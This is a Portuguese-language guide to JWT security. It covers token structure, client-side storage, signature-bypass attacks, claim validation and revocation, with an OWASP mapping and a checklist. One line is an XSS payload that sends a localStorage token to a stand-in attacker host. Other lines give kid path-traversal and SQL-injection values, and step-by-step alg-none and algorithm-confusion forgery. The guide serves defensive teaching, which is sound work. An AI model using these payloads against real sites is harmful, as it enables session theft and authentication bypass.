# Guia Definitivo de Segurança para JWT: Armazenamento, Uso e Vulnerabilidades Comuns

## Introdução aos JSON Web Tokens (JWTs)

*JSON Web Token* (JWT) é um padrão aberto (RFC 7519) que define uma forma compacta e autocontida de transmitir informações de forma segura entre as partes como um objeto JSON. Essas informações podem ser verificadas e consideradas confiáveis porque são assinadas digitalmente. Apesar de seu uso generalizado em autenticação e autorização, especialmente em arquiteturas de microsserviços e *Single Page Applications* (SPAs), a flexibilidade do padrão JWT impõe uma carga significativa sobre os desenvolvedores para garantir uma implementação segura. Uma compreensão superficial de seus mecanismos frequentemente leva a vulnerabilidades críticas que podem comprometer sistemas inteiros. Este relatório oferece uma análise aprofundada das inseguranças relacionadas ao armazenamento e uso de JWTs, desmistificando conceitos comuns e fornecendo um roteiro para uma implementação robusta e segura.

## A Anatomia de um JWT: Cabeçalho, Payload e Assinatura

Um JWT é estruturalmente simples, consistindo em três partes codificadas em *Base64Url* e separadas por pontos (.), no formato `cabeçalho.payload.assinatura`. Essa estrutura compacta o torna ideal para ser transmitido em cabeçalhos HTTP ou parâmetros de URL.

- **Cabeçalho (JOSE Header)**: O primeiro segmento é um objeto JSON que contém metadados sobre o token. Os dois campos mais importantes são o `typ` (tipo), que é quase sempre "JWT", e o `alg` (algoritmo), que especifica o algoritmo criptográfico usado para gerar a assinatura, como *HS256* ou *RS256*. O cabeçalho também pode incluir parâmetros opcionais como o `kid` (*Key ID*), que auxilia o servidor a identificar a chave correta para verificação, um recurso útil em cenários com rotação de chaves.
- **Payload (Carga Útil)**: O segundo segmento é um objeto JSON que contém as *claims* (reivindicações). As *claims* são declarações sobre uma entidade (geralmente o usuário) e dados adicionais. É fundamental entender que o *payload* é apenas codificado, não criptografado, e, portanto, qualquer pessoa que intercepte o token pode ler seu conteúdo.
- **Assinatura (Signature)**: O terceiro e último segmento é a assinatura criptográfica. Ela é gerada aplicando-se o algoritmo especificado no cabeçalho a uma concatenação do cabeçalho e do *payload* codificados, usando uma chave secreta (para *HMAC*) ou uma chave privada (para *RSA*/*ECDSA*). A assinatura é o que garante a integridade do token, permitindo que o servidor verifique se o cabeçalho e o *payload* não foram adulterados desde sua emissão. No caso de algoritmos assimétricos, ela também garante a autenticidade do emissor.

## O Papel das Assinaturas Criptográficas: HMAC vs. Algoritmos Assimétricos (RSA/ECDSA)

A segurança de um JWT reside em sua assinatura, e a escolha do algoritmo tem implicações diretas na arquitetura de segurança.

- **Algoritmos Simétricos (HMAC)**: Algoritmos como *HS256* (*HMAC* com *SHA-256*) usam uma única chave secreta compartilhada tanto para assinar quanto para verificar o token. Essa abordagem é computacionalmente mais simples. No entanto, sua principal desvantagem é que qualquer serviço que precise verificar um token também deve ter acesso à chave secreta, o que significa que ele também pode criar e assinar novos tokens. Isso aumenta a superfície de ataque; um comprometimento da chave em qualquer um dos serviços compromete todo o sistema.
- **Algoritmos Assimétricos (RSA/ECDSA)**: Algoritmos como *RS256* (*RSA* com *SHA-256*) utilizam um par de chaves: uma privada e uma pública. O token é assinado com a chave privada, que deve ser mantida em segredo absoluto pelo servidor de autorização. A verificação é feita com a chave pública correspondente, que pode ser distribuída abertamente para os serviços que precisam validar os tokens. Essa separação é inerentemente mais segura, pois os serviços de recursos podem verificar tokens sem ter a capacidade de criá-los. Além disso, fornece não repúdio: apenas a entidade que possui a chave privada poderia ter assinado o token, provando sua origem de forma inequívoca. Por essas razões, algoritmos assimétricos como o *RS256* são a escolha recomendada para a maioria dos cenários de produção.

## Entendendo as Claims do JWT: Registradas, Públicas e Privadas

O *payload* de um JWT transporta *claims*, que são padronizadas pela RFC 7519 para garantir a interoperabilidade.

- **Claims Registradas**: São um conjunto de *claims* predefinidas e recomendadas, com nomes curtos de três caracteres para manter a compactação do token. As mais importantes para a segurança e validação são:
  - `iss` (*Issuer*): Identifica o principal que emitiu o JWT.
  - `sub` (*Subject*): Identifica o principal que é o sujeito do JWT (por exemplo, o ID do usuário).
  - `aud` (*Audience*): Identifica os destinatários para os quais o JWT se destina. Um servidor que recebe um token deve verificar se ele está na audiência pretendida.
  - `exp` (*Expiration Time*): Define um tempo de expiração (*timestamp* Unix) após o qual o JWT não deve ser aceito para processamento.
  - `nbf` (*Not Before*): Define um tempo (*timestamp* Unix) antes do qual o JWT não deve ser aceito para processamento.
  - `iat` (*Issued At*): Identifica o momento em que o JWT foi emitido.
  - `jti` (*JWT ID*): Fornece um identificador exclusivo para o JWT, que pode ser usado para evitar que o token seja reutilizado (ataques de *replay*).
- **Claims Públicas**: São *claims* personalizadas definidas por desenvolvedores. Para evitar colisões, seus nomes devem ser registrados no registro IANA *JSON Web Token* ou definidos como uma URI que contenha um *namespace* resistente a colisões.
- **Claims Privadas**: São *claims* personalizadas criadas para compartilhar informações entre partes que concordam em usá-las e não são nem *claims* registradas nem públicas.

## A Concepção Crítica e Equivocada: Codificação Base64Url Não é Criptografia

O equívoco mais perigoso e difundido sobre JWTs é a confusão entre codificação e criptografia. O cabeçalho e o *payload* de um *JWS* (*JSON Web Signature*), a forma mais comum de JWT, são simplesmente codificados usando *Base64Url*, uma variante do *Base64* segura para uso em URLs e cabeçalhos HTTP.

A codificação é um processo totalmente reversível que transforma dados binários em um formato de texto para transporte seguro. Ela não oferece nenhuma confidencialidade. Qualquer pessoa ou sistema que intercepte um JWT pode decodificar o cabeçalho e o *payload* com ferramentas amplamente disponíveis (como o depurador em *jwt.io*) e ler seu conteúdo em texto plano. A assinatura protege a integridade (os dados não foram alterados), mas não a confidencialidade (os dados não estão ocultos).

A confidencialidade é fornecida por um padrão separado da família *JOSE* (*JSON Object Signing and Encryption*) chamado *JWE* (*JSON Web Encryption*), que criptografa o conteúdo do token. No entanto, a grande maioria das implementações de autenticação JWT utiliza *JWS*, não *JWE*.

Essa distinção leva a uma regra de segurança fundamental e inegociável: nunca armazene informações sensíveis em um *payload* de JWT padrão. Isso inclui, mas não se limita a, senhas, Informações de Identificação Pessoal (*PII*), números de cartão de crédito ou quaisquer outros dados que não devam ser publicamente legíveis. A violação dessa regra constitui um vazamento de dados por design.

A flexibilidade da especificação JWT, embora poderosa, cria um terreno fértil para erros de implementação. O padrão define o parâmetro de cabeçalho `alg` e até inclui `none` como uma opção válida para "JWTs não seguros". A intenção era criar uma especificação abrangente, deixando a segurança da implementação a cargo dos desenvolvedores e das bibliotecas. No entanto, essa permissividade, combinada com o uso de bibliotecas com padrões inseguros ou uma compreensão incompleta das implicações, leva diretamente a vulnerabilidades. Um invasor pode simplesmente alterar o cabeçalho `alg` para `none`, remover a assinatura e submeter um token forjado que uma aplicação mal configurada aceitará como válido. A vulnerabilidade não é um "bug" no padrão, mas sim um resultado previsível de sua concepção, criando uma "armadilha" na qual os desenvolvedores podem facilmente cair.

## O Campo de Batalha do Lado do Cliente: Armazenamento Inseguro de JWT

A decisão de onde armazenar um JWT no cliente é uma das mais críticas para a segurança de uma aplicação. A escolha do mecanismo de armazenamento determina diretamente a exposição da aplicação a classes de ataque fundamentais, como *Cross-Site Scripting* (*XSS*) e *Cross-Site Request Forgery* (*CSRF*). A ascensão das *Single Page Applications* (*SPAs*) e arquiteturas de microsserviços impulsionou práticas de armazenamento que, embora convenientes, são frequentemente inseguras. As *SPAs*, que dependem fortemente de JavaScript para gerenciar o estado e fazer chamadas de API, encontraram no *localStorage* uma maneira fácil de persistir e acessar tokens. Essa conveniência, no entanto, veio ao custo de expor os tokens a ataques de *XSS*, criando um problema sistêmico que vai além de erros individuais de desenvolvedores.

### Uma Análise Comparativa dos Mecanismos de Armazenamento: Cookies, localStorage e sessionStorage

Existem três opções principais para armazenamento do lado do cliente, cada uma com um perfil de risco distinto.

- **localStorage**: É um armazenamento de chave-valor persistente. Os dados permanecem no navegador mesmo após o fechamento da janela ou aba e são acessíveis via JavaScript em qualquer script da mesma origem. Sua principal vulnerabilidade é a exposição a ataques de *XSS*. Por outro lado, é imune a ataques *CSRF* por padrão, pois os dados não são enviados automaticamente com as requisições HTTP.
- **sessionStorage**: Funciona de maneira semelhante ao *localStorage*, mas os dados são específicos da sessão da aba e são apagados quando a aba é fechada. Também é acessível via JavaScript e, portanto, igualmente vulnerável a *XSS*.
- **Cookies**: São enviados automaticamente com cada requisição HTTP para o mesmo domínio. Sua principal vantagem de segurança é a capacidade de serem marcados com a *flag* *HttpOnly*, o que os torna inacessíveis para scripts do lado do cliente, fornecendo uma defesa robusta contra o roubo de tokens via *XSS*. No entanto, sua principal desvantagem é a vulnerabilidade inerente a ataques *CSRF*, que deve ser mitigada com atributos adicionais como *SameSite*.

A escolha entre *localStorage* e *cookies* não é apenas uma decisão técnica, mas uma troca fundamental entre perfis de risco. Optar pelo *localStorage* significa que a segurança da sessão depende inteiramente da ausência de vulnerabilidades de *XSS*, uma postura de segurança frágil, pois uma única falha leva ao comprometimento total do token. Optar por *cookies* *HttpOnly* transfere o risco principal para *CSRF*. Com as defesas modernas do navegador, como o padrão *SameSite=Lax*, o risco de *CSRF* foi significativamente mitigado na plataforma, enquanto a defesa contra *XSS* permanece uma responsabilidade ativa e complexa do desenvolvedor. Isso torna os *cookies* a base para uma estratégia de armazenamento mais segura.

### Tabela 1: Comparação dos Mecanismos de Armazenamento de JWT no Lado do Cliente

| Mecanismo de Armazenamento | Risco de XSS | Risco de CSRF | Persistência | Caso de Uso Recomendado | Evidência Chave |
|----------------------------|--------------|---------------|--------------|-------------------------|-----------------|
| Em Memória (Variável JS)   | Baixo (vulnerável apenas durante a sessão ativa) | Baixo (não enviado automaticamente) | Apenas na sessão da página | Token de Acesso (curta duração) | 38 |
| localStorage               | Alto         | Baixo (não enviado automaticamente) | Permanente (até ser limpo) | Não recomendado para tokens | 36 |
| sessionStorage             | Alto         | Baixo (não enviado automaticamente) | Apenas na sessão da aba | Não recomendado para tokens | 37 |
| Cookie HttpOnly            | Baixo (inacessível para JS) | Alto (requer mitigação SameSite) | Configurável | Token de Atualização (longa duração) | 35 |

### A Ameaça XSS: Por que o localStorage é um Alvo de Alto Risco

*Cross-Site Scripting* (*XSS*) é uma vulnerabilidade que permite a um invasor injetar e executar scripts maliciosos no navegador de um usuário no contexto de um site confiável. Se um JWT for armazenado em *localStorage* ou *sessionStorage*, qualquer exploração de *XSS* bem-sucedida pode ler e exfiltrar o token.

O ataque é trivialmente simples. Um invasor que encontre uma falha de *XSS* (por exemplo, em um campo de comentário ou em um parâmetro de URL que é renderizado sem sanitização) pode injetar um *payload* como:

```html
<script>fetch('https://attacker-controlled-server.com/log?token=' + localStorage.getItem('jwt'))</script>
```

Este script simplesmente pega o token do *localStorage* e o envia para um servidor controlado pelo invasor. Uma vez que o token é roubado, o invasor pode usá-lo para se passar pelo usuário em todas as requisições à API, efetivamente sequestrando a sessão até que o token expire. Devido a esse risco severo, guias de segurança como o *OWASP Cheat Sheet Series* desaconselham fortemente o armazenamento de tokens de sessão em *localStorage*.

### A Ameaça CSRF: A Espada de Dois Gumes dos Cookies

*Cross-Site Request Forgery* (*CSRF*) é um ataque que força o navegador de um usuário autenticado a executar uma ação indesejada em um site confiável. Como os *cookies* são enviados automaticamente com as requisições, um site malicioso pode criar um formulário que, quando submetido (mesmo que de forma invisível para o usuário), envia uma requisição para o site alvo (por exemplo, `https://banco.com/transferir`). O navegador da vítima incluirá automaticamente o *cookie* JWT, fazendo com que o servidor execute a ação como se fosse legitimamente iniciada pelo usuário.

A defesa primária contra *CSRF* é o atributo de *cookie* *SameSite*:

- **SameSite=Strict**: O *cookie* só é enviado em requisições que se originam do mesmo site. Isso bloqueia efetivamente o *CSRF*, mas pode quebrar fluxos legítimos, como clicar em um link para o site a partir de um e-mail.
- **SameSite=Lax**: Oferece um bom equilíbrio. O *cookie* não é enviado em sub-requisições de sites cruzados (como imagens ou *iframes*) nem com requisições POST de sites cruzados, mas é enviado quando o usuário navega para a URL (por exemplo, clicando em um link). Este é o comportamento padrão na maioria dos navegadores modernos e mitiga a maioria dos vetores de ataque *CSRF*.

Uma camada adicional de defesa é o padrão *Double Submit Cookie*. Nesse padrão, o servidor define um token *CSRF* em um *cookie* legível por JavaScript. O script do cliente lê esse token do *cookie* e o inclui em um cabeçalho HTTP personalizado (por exemplo, `X-CSRF-TOKEN`) em todas as requisições que alteram o estado. O servidor então verifica se o valor no cabeçalho corresponde ao valor no *cookie*. Um site malicioso não pode realizar esse ataque porque a política de mesma origem o impede de ler o *cookie* para definir o cabeçalho corretamente.

## Padrões de Armazenamento Recomendados: O Modelo de Token de Atualização/Token de Acesso

A melhor prática da indústria, endossada por especialistas em segurança e pelo *OWASP*, é uma abordagem híbrida que mitiga tanto *XSS* quanto *CSRF*, aproveitando os pontos fortes de cada mecanismo de armazenamento. Este padrão não apenas escolhe um risco em detrimento do outro; ele mitiga ativamente ambos.

- **Token de Acesso (JWT de curta duração)**: Este token é usado para acessar recursos protegidos e deve ter uma vida útil muito curta (por exemplo, 5 a 15 minutos) para minimizar a janela de oportunidade caso seja comprometido. Ele deve ser armazenado em memória, como em uma variável JavaScript dentro de um *closure*, e não em *localStorage* ou *sessionStorage*. Isso o torna imune ao roubo via *XSS* entre recarregamentos de página.
- **Token de Atualização (Opaque ou JWT de longa duração)**: Este token é usado exclusivamente para obter um novo token de acesso quando o antigo expira. Ele deve ter uma vida útil longa (dias ou semanas) para proporcionar uma boa experiência ao usuário. Ele deve ser armazenado em um *cookie* seguro, com as *flags* *HttpOnly*, *SameSite* e *Secure*:
  - *HttpOnly*: Impede o acesso via JavaScript, mitigando o roubo por *XSS*.
  - *SameSite=Strict* ou *SameSite=Lax*: Impede ataques *CSRF*.
  - *Secure*: Garante que o *cookie* seja enviado apenas sobre conexões HTTPS.

O fluxo de autenticação com este padrão funciona da seguinte maneira:

1. O usuário faz *login*. O servidor retorna um token de acesso de curta duração no corpo da resposta e um token de atualização de longa duração em um *cookie* *HttpOnly* seguro.
2. A aplicação cliente armazena o token de acesso em memória.
3. Para chamadas de API, o cliente envia o token de acesso no cabeçalho `Authorization: Bearer`.
4. Quando o token de acesso expira (resultando em um erro 401 da API), a aplicação cliente faz uma requisição para um *endpoint* específico, como `/refresh_token`. O navegador envia automaticamente o *cookie* do token de atualização com esta requisição.
5. O servidor valida o token de atualização, verifica se ele não foi revogado e, se for válido, emite um novo token de acesso.

Para segurança adicional, o padrão *Refresh Token Rotation* pode ser implementado, onde um novo token de atualização também é emitido a cada atualização, e o token de atualização antigo é invalidado. Se um token de atualização antigo for usado, isso indica um possível roubo, e o servidor pode invalidar toda a sessão do usuário.

## Armadilhas Comuns de Implementação e Vetores de Ataque

Passando do armazenamento no cliente para a validação no servidor, esta seção detalha as vulnerabilidades mais críticas que surgem de uma lógica de processamento de JWT falha. A raiz da maioria dessas vulnerabilidades graves é o servidor confiar em dados não verificados do próprio token para informar seu processo de verificação. Um sistema seguro deve tratar todo o token recebido como não confiável até que sua integridade e suas *claims* tenham sido validadas em relação a uma configuração rígida e predefinida no lado do servidor.

### Vulnerabilidades de Bypass de Validação de Assinatura

Esta é a classe mais crítica de vulnerabilidades de JWT. Se a assinatura não for verificada corretamente, o token inteiro se torna inútil como mecanismo de segurança, pois sua integridade não pode ser garantida.

#### O Ataque `alg: 'none'`: Desarmando a Assinatura

A especificação JWT permite um valor de `alg` de `none` para tokens não seguros, originalmente destinado a cenários de depuração ou quando a integridade é garantida por outros meios. No entanto, bibliotecas JWT, especialmente versões mais antigas, interpretavam um token com `alg: 'none'` como um token válido com uma assinatura verificada.

O ataque se desenrola da seguinte forma:

1. Um invasor obtém um JWT legítimo.
2. Ele decodifica o cabeçalho e o *payload* (que são apenas *Base64Url*).
3. No cabeçalho, ele altera o valor de `alg` para `none`. Variações insensíveis a maiúsculas e minúsculas como `None` ou `nOnE` também podem funcionar contra implementações falhas.
4. Ele modifica o *payload* para escalar privilégios, por exemplo, alterando `{"admin": false}` para `{"admin": true}`.
5. Ele remove completamente a parte da assinatura do token.
6. O token forjado, agora no formato `header.payload.`, é enviado ao servidor.
7. Se o servidor for vulnerável, ele processará o cabeçalho, verá `alg: 'none'` e pulará a verificação da assinatura, aceitando o *payload* malicioso como válido e concedendo ao invasor acesso de administrador.

**Mitigação**: A biblioteca JWT no servidor deve ser configurada explicitamente para aceitar apenas uma lista de algoritmos fortes permitidos (por exemplo, *RS256*, *HS256*). Qualquer token que especifique `alg: 'none'` ou qualquer outro algoritmo não permitido deve ser categoricamente rejeitado.

#### Confusão de Algoritmo: O Ataque de Downgrade de RS256 para HS256

Este é um ataque sutil e devastador que explora uma confusão de tipos na forma como os servidores lidam com chaves simétricas e assimétricas.

O cenário de ataque é o seguinte:

1. Um servidor está configurado para usar *RS256* (assimétrico). Ele assina tokens com uma chave privada e disponibiliza a chave pública para verificação.
2. O invasor obtém a chave pública do servidor. Isso é frequentemente possível, pois as chaves públicas são, por design, públicas e podem ser expostas em um *endpoint* padrão como `/.well-known/jwks.json`.
3. O invasor forja um novo token. No cabeçalho, ele altera o `alg` de *RS256* para *HS256* (simétrico).
4. Ele então assina este novo token usando o algoritmo *HS256*, mas usa a chave pública do servidor como a chave secreta do *HMAC*.
5. O servidor vulnerável recebe o token. Ele lê o cabeçalho, vê `alg: 'HS256'` e procura a chave secreta para verificar a assinatura. Devido a uma lógica de implementação falha, ele usa a chave pública que tem configurada para *RS256* como se fosse a chave secreta para *HS256*.
6. Como o token foi assinado com a mesma chave (a chave pública), a verificação da assinatura *HS256* é bem-sucedida, e o token malicioso é aceito.

**Mitigação**: A lógica de validação do lado do servidor NUNCA deve confiar no cabeçalho `alg` para selecionar o método de verificação. O servidor deve ter um algoritmo esperado e pré-configurado para um determinado contexto e deve usar apenas esse algoritmo e a chave correspondente para a verificação, ignorando o valor `alg` do token.

#### Falha na Verificação: Os Perigos de `jwt.decode()`

Muitas bibliotecas JWT oferecem duas funções distintas: `decode()` e `verify()`.

- **`decode()`**: Esta função simplesmente decodifica as partes do token em *Base64Url* e retorna o *payload*. Ela não realiza nenhuma verificação de assinatura. Seu uso pretendido é para depuração ou para ler dados de um token que já foi verificado e considerado confiável.
- **`verify()`**: Esta função realiza a validação criptográfica completa da assinatura, além de verificar *claims* como a de expiração.

Um erro comum de desenvolvimento é usar `decode()` em vez de `verify()` em tokens não confiáveis recebidos de clientes. Isso ignora completamente a assinatura e todas as garantias de segurança do JWT, tornando a aplicação vulnerável a qualquer tipo de falsificação de token.

#### Chaves Comprometidas e Segredos Fracos

A segurança de um JWT assinado depende inteiramente da segurança da chave de assinatura.

##### Força Bruta de Segredos HMAC Fracos

Se um	token *HS256* for assinado com um segredo fraco e previsível (como "secret", "123456" ou o nome da empresa), um invasor pode descobrir a chave por meio de um ataque de *força bruta* *offline*. O invasor precisa apenas de um token válido emitido pelo servidor. Com esse token, o cabeçalho e o *payload* conhecidos, e a assinatura resultante, ele pode usar ferramentas como *jwt_tool* ou *c-jwt-cracker* com uma lista de palavras para testar rapidamente milhares de segredos potenciais até encontrar aquele que gera a mesma assinatura. Uma vez que o segredo é descoberto, o invasor pode forjar qualquer token com qualquer *payload* e assiná-lo validamente.

**Mitigação**: Para algoritmos *HMAC* como *HS256*, use um segredo gerado criptograficamente com alta entropia, com pelo menos 256 bits (32 bytes) de comprimento. Nunca use senhas legíveis por humanos ou segredos codificados no código-fonte.

#### Exploração de Parâmetros de Cabeçalho: Injeção de `jku`, `jwk` e `kid`

O padrão *JWS* permite que o cabeçalho contenha parâmetros que apontam para a chave necessária para a verificação. Se o servidor confiar cegamente nesses parâmetros, um invasor pode instruí-lo a usar uma chave controlada por ele.

- **`jku` (*JWK Set URL*)**: Uma URL que aponta para um conjunto de chaves em formato *JSON Web Key*. Um invasor pode modificar este parâmetro para apontar para uma URL em seu próprio servidor, que hospeda sua própria chave pública.
- **`jwk` (*JSON Web Key*)**: Incorpora a chave pública diretamente no cabeçalho. Um invasor pode substituir a chave legítima pela sua própria.
- **`kid` (*Key ID*)**: Um identificador para a chave. Se este valor for usado de forma insegura, por exemplo, como parte de um caminho de arquivo para ler a chave do disco, ele pode ser vulnerável a ataques de *Path Traversal* (ex: `kid: "../../../../../dev/null"`). Se for usado em uma consulta a banco de dados, pode ser vulnerável a *SQL Injection* (ex: `kid: "' UNION SELECT 'attacker-key' --"`).

**Mitigação**: O servidor deve manter uma lista de permissões (*allowlist*) de chaves ou URLs de chaves confiáveis. Ele nunca deve buscar chaves de locais arbitrários especificados no cabeçalho de um token. Qualquer entrada do parâmetro `kid` deve ser rigorosamente validada e sanitizada antes de ser usada.

### Vulnerabilidades Baseadas no Payload

Mesmo um token com uma assinatura válida pode ser explorado se seu *payload* for mal projetado ou se suas *claims* não forem validadas corretamente.

#### Exposição de Dados Sensíveis em Payloads Não Criptografados

Conforme estabelecido anteriormente, os *payloads* *JWS* não são confidenciais. Armazenar Informações de Identificação Pessoal (*PII*), credenciais ou outros dados sensíveis no *payload* é um vazamento de dados por design. Qualquer pessoa com acesso ao token pode ler esses dados.

**Mitigação**: Não coloque dados sensíveis no *payload*. Use identificadores opacos (como um UUID de usuário) e faça com que o servidor busque os dados sensíveis de um banco de dados seguro quando necessário. Se a confidencialidade for um requisito, use *JWE* para criptografar o token.

#### Validação Inadequada de Claims: `iss`, `aud` e Claims Temporais (`exp`, `nbf`)

Um token criptograficamente válido não é necessariamente um token logicamente válido para um determinado contexto. O servidor deve validar as *claims* registradas para garantir que o token seja usado como pretendido.

- **`exp` (*Expiration Time*)**: O servidor DEVE verificar se o token não expirou. A falha em fazer isso permite o uso indefinido de tokens potencialmente comprometidos.
- **`nbf` (*Not Before*)**: O servidor DEVE verificar se o token não está sendo usado prematuramente.
- **`iss` (*Issuer*)**: O servidor DEVE validar se o token foi emitido por uma autoridade confiável e esperada.
- **`aud` (*Audience*)**: O servidor DEVE validar se ele é o destinatário pretendido do token. Isso impede que um token emitido para um serviço (ex: `api.servico.com`) seja usado para acessar outro (ex: `admin.servico.com`).

**Mitigação**: Use uma biblioteca JWT robusta que imponha a validação dessas *claims* padrão por padrão e configure-as com os valores esperados para sua aplicação.

#### Ataques de Replay: A Importância de `jti` e `exp`

Um ataque de *replay* ocorre quando um invasor intercepta um token válido e o reenvia ao servidor para se passar pelo usuário.

- A *claim* `exp` oferece uma defesa básica, limitando a janela de tempo em que um token roubado pode ser usado.
- Para uma proteção mais forte, a *claim* `jti` (*JWT ID*) deve ser usada. Este é um identificador único, do tipo *nonce* (número usado uma vez), para o token. Para evitar ataques de *replay*, o servidor deve manter um registro dos valores de `jti` que já processou (pelo menos até que o token original expire) e rejeitar qualquer token com um `jti` que já tenha sido visto. Embora isso adicione um elemento de estado a um sistema supostamente "sem estado", é uma defesa necessária para operações de alta segurança.

## O Dilema do "Stateless": Estratégias de Revogação de JWT

Esta seção aborda o desafio arquitetônico mais significativo do uso de JWTs para gerenciamento de sessões. A natureza "sem estado" (*stateless*) dos JWTs, frequentemente citada como um de seus principais benefícios, entra em conflito direto com o requisito crítico de segurança de poder invalidar uma sessão imediatamente. A realidade é que, para qualquer aplicação segura do mundo real, o conceito de sessões JWT puramente sem estado é um mito. A necessidade de revogação é inegociável, e toda estratégia robusta de revogação reintroduz fundamentalmente o estado do lado do servidor.

### O Desafio Inerente: Por que Tokens "Stateless" são Difíceis de Invalidar

Um JWT é autocontido. O servidor o valida com base em sua assinatura e *claims* (especialmente a `exp`), sem a necessidade de consultar um armazenamento de sessão central. Esta é a definição de "sem estado". O problema fundamental é que, uma vez que um token é emitido, ele permanece válido até expirar. Não há um mecanismo embutido no padrão para "matar" ou revogar um token específico antes de seu tempo de expiração (`exp`).

Isso se torna um problema de segurança crítico em cenários comuns como:

- Um usuário faz *logout*, mas o token permanece válido.
- Um usuário altera sua senha, mas tokens antigos emitidos antes da alteração continuam funcionando.
- Um administrador bane um usuário ou revoga suas permissões.
- Um token é sabidamente comprometido ou roubado.

Em todos esses casos, um token antigo ou roubado continua sendo uma credencial válida que um invasor pode usar para acessar o sistema até que ele expire naturalmente, o que pode levar a um comprometimento prolongado.

### Construindo uma Defesa com Estado: O Padrão de Denylist (Blocklist) de Tokens

Para resolver o problema da revogação, é necessário reintroduzir o estado no lado do servidor, negando parcialmente o benefício do "stateless". A abordagem mais direta é a *denylist* de tokens.

- **Como funciona**: Quando um token precisa ser revogado (por exemplo, em uma chamada de *logout*), o servidor armazena um identificador único desse token em uma *denylist* ou *blocklist*. O identificador ideal para isso é a *claim* `jti` (*JWT ID*), que é projetada para ser um identificador único para o token.
- **Processo de validação**: Em cada requisição recebida, após verificar com sucesso a assinatura e a expiração do token, o servidor deve realizar uma etapa adicional: consultar a *denylist* para ver se o `jti` do token está presente. Se estiver, a requisição deve ser rejeitada, mesmo que o token seja criptograficamente válido.
- **Implementação**: A *denylist* é frequentemente implementada usando um banco de dados em memória de alta velocidade, como o *Redis*. O *Redis* é particularmente adequado porque permite definir um *Tempo de Vida* (*TTL*) para cada entrada. O *TTL* da `jti` na *denylist* pode ser definido para corresponder ao tempo de expiração original do token, garantindo que a lista seja limpa automaticamente e não cresça indefinidamente.

A principal desvantagem dessa abordagem é que ela adiciona uma consulta ao banco de dados a cada requisição de API, o que aumenta a latência, a complexidade e cria um potencial ponto único de falha.

### Uma Abordagem Alternativa: Tokens de Curta Duração e o Fluxo de Refresh Token

O padrão de *refresh token*, já discutido para armazenamento seguro, também é uma estratégia de revogação eficaz e mais escalável.

- Ao usar tokens de acesso com vida útil muito curta (por exemplo, 5-15 minutos), a janela de oportunidade para um token roubado é drasticamente reduzida. A revogação, então, se concentra no *refresh token* de longa duração.
- Como o *refresh token* é usado apenas para um único propósito (contatar o *endpoint* `/refresh_token`), é muito mais fácil gerenciar seu estado. Quando um usuário faz *logout* ou uma sessão precisa ser invalidada, o servidor simplesmente revoga o *refresh token* correspondente em seu banco de dados.
- O token de acesso roubado expirará em breve, e o invasor não conseguirá obter um novo porque o *refresh token* foi invalidado.

Essa abordagem oferece um benefício arquitetônico significativo: ela centraliza o gerenciamento de estado no serviço de autenticação, permitindo que os microsserviços de recursos permaneçam sem estado. Eles só precisam verificar a assinatura e a expiração dos tokens de acesso de curta duração, sem a necessidade de consultar uma *denylist* a cada chamada.

### Avaliando as Trocas: Escalabilidade, Desempenho e Segurança

A escolha entre as estratégias de revogação envolve uma análise cuidadosa das trocas.

- **Denylist**: Oferece revogação granular e imediata para qualquer token. No entanto, exige verificações com estado em cada chamada de API em todos os serviços, o que pode se tornar um gargalo de desempenho e escalabilidade em sistemas de alto tráfego.
- **Tokens de Curta Duração com Refresh Tokens**: Não oferece revogação imediata para o token de acesso, mas limita o dano à sua curta vida útil. Essa abordagem escala melhor porque apenas o serviço de autenticação central precisa ser com estado; os servidores de recursos podem permanecer sem estado.

A decisão depende dos requisitos de segurança da aplicação. Uma aplicação bancária, por exemplo, pode exigir a revogação imediata fornecida por uma *denylist*, enquanto um site de conteúdo pode considerar o perfil de risco dos tokens de curta duração aceitável. A dificuldade inerente à revogação de JWTs aumenta a importância de outros controles de segurança. Como a invalidação é complexa, a importância de tempos de expiração curtos (`exp`), armazenamento seguro (para mitigar o roubo) e segurança de transporte (HTTPS) é amplificada. Uma estratégia de defesa em profundidade não é opcional; é uma necessidade ditada pelas limitações inerentes do próprio formato do token.

## Uma Estrutura de Segurança Holística para JWTs

A segurança de JWTs não depende de uma única solução mágica, mas sim de uma cadeia de decisões de implementação corretas, desde a emissão até a revogação. Uma falha em qualquer elo pode comprometer todo o sistema. Esta seção final sintetiza as discussões anteriores em uma estrutura prática e acionável, mapeando os riscos de JWT para vulnerabilidades conhecidas e fornecendo um *checklist* abrangente para implementação e teste seguros.

### Alinhamento com o OWASP Top 10: Mapeando Riscos de JWT para Vulnerabilidades Comuns

As vulnerabilidades de JWT não são uma categoria exótica e isolada de falhas, mas sim instâncias específicas de riscos de segurança de aplicações web bem conhecidos, conforme catalogado pelo *OWASP Top 10*.

- **A01:2021 - Quebra de Controle de Acesso**: A capacidade de forjar JWTs com *claims* modificadas (por exemplo, `isAdmin: true`, um `sub` diferente) para acessar dados ou funcionalidades não autorizadas é um exemplo clássico desta categoria.
- **A02:2021 - Falhas Criptográficas**: Esta categoria mapeia diretamente para o uso de segredos fracos, o ataque `alg: 'none'`, a confusão de algoritmos, a falha na verificação da assinatura e o armazenamento de dados sensíveis em *payloads* não criptografados.
- **A04:2021 - Design Inseguro**: Escolher usar JWTs para gerenciamento de sessão sem implementar uma estratégia de revogação viável é uma falha de design que ignora um requisito de segurança fundamental.
- **A05:2021 - Má Configuração de Segurança**: Falhar em configurar a biblioteca JWT para rejeitar o algoritmo `none` ou confiar cegamente em parâmetros de cabeçalho como `jku` ou `jwk` para obter chaves de verificação são exemplos de má configuração de segurança.
- **A07:2021 - Falhas de Identificação e Autenticação**: A falha em verificar adequadamente a assinatura de um JWT ou suas *claims* essenciais (como `exp` e `aud`) leva diretamente a um *bypass* de autenticação, permitindo que um invasor se passe por um usuário legítimo.

### Checklist de Implementação Segura: Um Guia para Desenvolvedores

Esta lista de verificação pragmática resume as principais mitigações discutidas ao longo deste relatório, servindo como uma referência rápida para desenvolvimento e revisão de código.

| Categoria             | Ação de Segurança                              | Detalhes e Justificativa                                                                 |
|----------------------|-----------------------------------------------|-----------------------------------------------------------------------------------------|
| **Emissão de Token** | Usar Chaves de Assinatura Fortes              | Para *HMAC* (*HS256*), use um segredo aleatório de 256 bits. Para *RSA* (*RS256*), use uma chave de pelo menos 2048 bits. Evita ataques de *força bruta*. |
|                      | Definir Tempos de Expiração Curtos            | Tokens de acesso devem ter vida curta (5-15 min) para limitar a janela de ataque em caso de roubo. Use *refresh tokens* para sessões longas. |
